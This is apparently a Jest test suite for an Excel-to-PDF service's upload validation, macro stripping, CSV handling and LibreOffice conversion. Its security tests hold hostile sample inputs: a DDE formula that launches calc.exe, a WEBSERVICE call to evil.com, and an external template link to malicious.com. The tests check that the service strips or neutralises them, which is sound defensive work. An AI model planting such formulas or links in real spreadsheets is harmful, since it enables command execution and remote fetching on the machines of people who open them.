/**
 * Excel to PDF — API & Engine Integration Tests
 */

import request from 'supertest';
import { createApp } from '../src/app';
import { Express } from 'express';
import JSZip from 'jszip';
import { PDFDocument } from 'pdf-lib';
import { validateSpreadsheetFile } from '../src/services/excel-to-pdf/validate';
import { convertCsvToXlsxBuffer } from '../src/services/excel-to-pdf/csv-handler';
import { normalizeXlsx } from '../src/services/excel-to-pdf/normalize-xlsx';
import { checkLibreOffice } from '../src/services/office-to-pdf';

// ──────────────────────────────────────────────────────────────
// Fixture Generators
// ──────────────────────────────────────────────────────────────

async function createBasicXlsxBuffer(sheetName = 'Sheet1', cellA1 = 'Sample Data'): Promise<Buffer> {
  const zip = new JSZip();

  zip.file('[Content_Types].xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>`);

  zip.file('_rels/.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>`);

  zip.file('xl/workbook.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="${sheetName}" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>`);

  zip.file('xl/_rels/workbook.xml.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>`);

  zip.file('xl/worksheets/sheet1.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <dimension ref="A1:B2"/>
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr"><is><t>${cellA1}</t></is></c>
      <c r="B1" t="inlineStr"><is><t>Header B</t></is></c>
    </row>
    <row r="2">
      <c r="A2"><v>123.45</v></c>
      <c r="B2"><v>678.90</v></c>
    </row>
  </sheetData>
</worksheet>`);

  return zip.generateAsync({ type: 'nodebuffer' });
}

async function createMultiSheetXlsx(): Promise<Buffer> {
  const zip = new JSZip();

  zip.file('[Content_Types].xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>`);

  zip.file('_rels/.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>`);

  zip.file('xl/workbook.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sales" sheetId="1" r:id="rId1"/>
    <sheet name="Expenses" sheetId="2" r:id="rId2"/>
  </sheets>
</workbook>`);

  zip.file('xl/_rels/workbook.xml.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/>
</Relationships>`);

  zip.file('xl/worksheets/sheet1.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Sales Total: $10,000</t></is></c></row>
  </sheetData>
</worksheet>`);

  zip.file('xl/worksheets/sheet2.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Expenses Total: $4,000</t></is></c></row>
  </sheetData>
</worksheet>`);

  return zip.generateAsync({ type: 'nodebuffer' });
}

// ──────────────────────────────────────────────────────────────
// Tests Suite
// ──────────────────────────────────────────────────────────────

describe('Excel to PDF API — Validation & Security', () => {
  let app: Express;

  beforeAll(() => {
    app = createApp();
  });

  test('POST /api/v1/excel-to-pdf/convert → 400 when no files uploaded', async () => {
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .expect(400);

    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('NO_FILES_UPLOADED');
  });

  test('POST /api/v1/excel-to-pdf/convert → 400 for zero-byte file', async () => {
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', Buffer.from(''), { filename: 'empty.xlsx', contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' })
      .expect(400);

    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('ZERO_BYTE_FILE');
  });

  test('POST /api/v1/excel-to-pdf/convert → 415 for unsupported file type', async () => {
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', Buffer.from('%PDF-1.4 test binary'), { filename: 'file.pdf', contentType: 'application/pdf' })
      .expect(415);

    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('UNSUPPORTED_FILE');
  });

  test('POST /api/v1/excel-to-pdf/convert → 415 for fake .xlsx (not a ZIP)', async () => {
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', Buffer.from('Not a zip archive'), { filename: 'fake.xlsx', contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' })
      .expect(415);

    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('UNSUPPORTED_FILE');
  });

  test('POST /api/v1/excel-to-pdf/convert → 415 for fake .xls (not OLE2)', async () => {
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', Buffer.from('Not an OLE2 binary stream'), { filename: 'fake.xls', contentType: 'application/vnd.ms-excel' })
      .expect(415);

    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('UNSUPPORTED_FILE');
  });

  test('validateSpreadsheet rejects encrypted OOXML file with 422', async () => {
    const zip = new JSZip();
    zip.file('EncryptedPackage', Buffer.from('encrypted data'));
    zip.file('EncryptionInfo', Buffer.from('encryption info'));
    const encryptedBuf = await zip.generateAsync({ type: 'nodebuffer' });

    await expect(validateSpreadsheetFile(encryptedBuf, 'secure.xlsx')).rejects.toMatchObject({
      code: 'ENCRYPTED_DOCUMENT',
      statusCode: 422
    });
  });

  test('validateSpreadsheet rejects binary file with NUL bytes disguised as CSV', async () => {
    const binaryCsv = Buffer.from('col1,col2\x00\x01\x02,val2\n');
    await expect(validateSpreadsheetFile(binaryCsv, 'corrupt.csv')).rejects.toMatchObject({
      code: 'UNSUPPORTED_FILE',
      statusCode: 415
    });
  });
});

describe('Spreadsheet Normalizer & Security Stripping', () => {
  test('strips VBA projects, Excel 4 macros, and external relationships', async () => {
    const zip = new JSZip();
    zip.file('[Content_Types].xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>`);
    zip.file('_rels/.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>`);
    zip.file('xl/workbook.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets><sheet name="Test" sheetId="1" r:id="rId1"/></sheets>
</workbook>`);
    zip.file('xl/_rels/workbook.xml.rels', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2006/relationships/attachedTemplate" Target="http://malicious.com/exploit.dotm" TargetMode="External"/>
</Relationships>`);
    zip.file('xl/vbaProject.bin', Buffer.from('fake vba code'));
    zip.file('xl/macrosheets/sheet1.xml', `<macroSheet/>`);
    zip.file('xl/worksheets/sheet1.xml', `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1"><f>cmd|'/c calc.exe'!A1</f><v>999</v></c>
      <c r="B1"><f>WEBSERVICE("http://evil.com")</f><v>safe_cache</v></c>
    </row>
  </sheetData>
</worksheet>`);

    const rawBuf = await zip.generateAsync({ type: 'nodebuffer' });
    const normalized = await normalizeXlsx(rawBuf, {
      output: 'pdf',
      sheets: { mode: 'all' },
      pageSize: 'a4',
      orientation: 'portrait',
      scaling: 'fit_width',
      margins: 'normal',
      gridlines: true,
      headings: false,
      repeatHeader: true,
      pageNumbers: false,
      bookmarks: true,
      trimEmpty: true,
      merge: false
    });

    expect(normalized.warnings.length).toBeGreaterThan(0);
    expect(normalized.warnings.some(w => w.includes('VBA macro'))).toBe(true);

    const outZip = await JSZip.loadAsync(normalized.buffer);
    expect(outZip.file('xl/vbaProject.bin')).toBeNull();
    expect(outZip.file('xl/macrosheets/sheet1.xml')).toBeNull();

    const sheetXml = await outZip.file('xl/worksheets/sheet1.xml')?.async('text');
    expect(sheetXml).toBeDefined();
    // Formula cmd| should be stripped and cached value preserved
    expect(sheetXml).not.toContain('cmd|');
    expect(sheetXml).not.toContain('WEBSERVICE');
    expect(sheetXml).toContain('<v>999</v>');
    expect(sheetXml).toContain('<v>safe_cache</v>');
  });

  test('filters sheets when mode is "first"', async () => {
    const multiSheetBuf = await createMultiSheetXlsx();
    const normalized = await normalizeXlsx(multiSheetBuf, {
      output: 'pdf',
      sheets: { mode: 'first' },
      pageSize: 'as_file',
      orientation: 'as_file',
      scaling: 'as_file',
      margins: 'as_file',
      gridlines: false,
      headings: false,
      repeatHeader: false,
      pageNumbers: false,
      bookmarks: true,
      trimEmpty: true,
      merge: false
    });

    const outZip = await JSZip.loadAsync(normalized.buffer);
    const wbXml = await outZip.file('xl/workbook.xml')?.async('text');
    expect(wbXml).toContain('name="Sales"');
    expect(wbXml).toContain('name="Expenses"');
    expect(wbXml).toContain('state="hidden"');
  });
});

describe('CSV & TSV Handler', () => {
  test('parses comma-separated values into formatted XLSX buffer', async () => {
    const csv = 'Name,Amount,Code\nAlice,100,00123\nBob,200,00456\n';
    const { xlsxBuffer: xlsxBuf } = await convertCsvToXlsxBuffer(Buffer.from(csv), 'test.csv');

    const zip = await JSZip.loadAsync(xlsxBuf);
    const sharedStrings = await zip.file('xl/sharedStrings.xml')?.async('text');
    expect(sharedStrings).toBeDefined();
    // Leading zeros preserved in Code
    expect(sharedStrings).toContain('00123');
    expect(sharedStrings).toContain('00456');
  });

  test('neutralizes spreadsheet formula injection in CSV (=, +, -, @)', async () => {
    const evilCsv = 'FormulaCol\n=cmd|\'/c calc.exe\'!A1\n+1234\n@SUM(1,2)\n-danger\n';
    const { xlsxBuffer: xlsxBuf } = await convertCsvToXlsxBuffer(Buffer.from(evilCsv), 'test.csv');

    const zip = await JSZip.loadAsync(xlsxBuf);
    const sharedStrings = await zip.file('xl/sharedStrings.xml')?.async('text');
    expect(sharedStrings).toBeDefined();
    // Formulas must be stored as plain strings (not executed as formulas)
    expect(sharedStrings).toContain('=cmd|');
    expect(sharedStrings).toContain('+1234');
    expect(sharedStrings).toContain('@SUM');

    // Worksheet must not contain any formula <f> tags
    const sheetXml = await zip.file('xl/worksheets/sheet1.xml')?.async('text');
    expect(sheetXml).not.toContain('<f>');
  });
});

describe('Excel to PDF API — LibreOffice Calc Integration', () => {
  let app: Express;
  let calcAvailable = false;

  beforeAll(async () => {
    app = createApp();
    const lo = await checkLibreOffice();
    calcAvailable = lo.available;
  });

  test('converts basic .xlsx to PDF successfully with custom options', async () => {
    if (!calcAvailable) {
      console.warn('LibreOffice Calc not installed, skipping integration test');
      return;
    }

    const xlsxBuf = await createBasicXlsxBuffer('Report', 'Financial Report Q3');
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .field('options', JSON.stringify({
        output: 'pdf',
        pageSize: 'a4',
        orientation: 'portrait',
        scaling: 'fit_width',
        gridlines: true,
        repeatHeader: true
      }))
      .attach('files', xlsxBuf, {
        filename: 'report.xlsx',
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
      })
      .expect(200);

    expect(res.body.success).toBe(true);
    expect(res.body.data.jobId).toBeDefined();
    expect(res.body.data.isZip).toBe(false);
    expect(res.body.data.filename).toBe('report.pdf');
    expect(res.body.data.files[0].pageCount).toBeGreaterThan(0);

    // Verify download
    const dlRes = await request(app)
      .get(res.body.data.downloadUrl)
      .expect(200);

    expect(dlRes.headers['content-type']).toMatch(/application\/pdf/);
    const pdfDoc = await PDFDocument.load(dlRes.body);
    expect(pdfDoc.getPageCount()).toBeGreaterThan(0);
  }, 30000);

  test('converts CSV to PDF successfully', async () => {
    if (!calcAvailable) return;

    const csvData = 'Item,Quantity,Price\nLaptop,5,1200\nMouse,20,25\nKeyboard,15,75\n';
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', Buffer.from(csvData), {
        filename: 'inventory.csv',
        contentType: 'text/csv'
      })
      .expect(200);

    expect(res.body.success).toBe(true);
    expect(res.body.data.filename).toBe('inventory.pdf');
    expect(res.body.data.files[0].pageCount).toBe(1);
  }, 30000);

  test('merges multiple spreadsheets into single PDF when merge: true', async () => {
    if (!calcAvailable) return;

    const file1 = await createBasicXlsxBuffer('SheetA', 'File 1 Data');
    const file2 = await createBasicXlsxBuffer('SheetB', 'File 2 Data');

    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .field('options', JSON.stringify({ merge: true }))
      .attach('files', file1, { filename: 'file1.xlsx', contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' })
      .attach('files', file2, { filename: 'file2.xlsx', contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' })
      .expect(200);

    expect(res.body.success).toBe(true);
    expect(res.body.data.isZip).toBe(false);
    expect(res.body.data.filename).toBe('file1_merged.pdf');
    expect(res.body.data.files.length).toBe(2);

    const dlRes = await request(app)
      .get(res.body.data.downloadUrl)
      .expect(200);

    const pdfDoc = await PDFDocument.load(dlRes.body);
    expect(pdfDoc.getPageCount()).toBeGreaterThanOrEqual(2);
  }, 45000);

  test('download deletes job from store (ephemeral job store)', async () => {
    if (!calcAvailable) return;

    const xlsxBuf = await createBasicXlsxBuffer('OneShot', 'Ephemeral Data');
    const res = await request(app)
      .post('/api/v1/excel-to-pdf/convert')
      .attach('files', xlsxBuf, { filename: 'ephemeral.xlsx' })
      .expect(200);

    const downloadUrl = res.body.data.downloadUrl;

    // First download succeeds
    await request(app).get(downloadUrl).expect(200);

    // Second download returns 404 because job was deleted
    const res404 = await request(app).get(downloadUrl).expect(404);
    expect(res404.body.error.code).toBe('DOWNLOAD_EXPIRED');
  }, 30000);
});
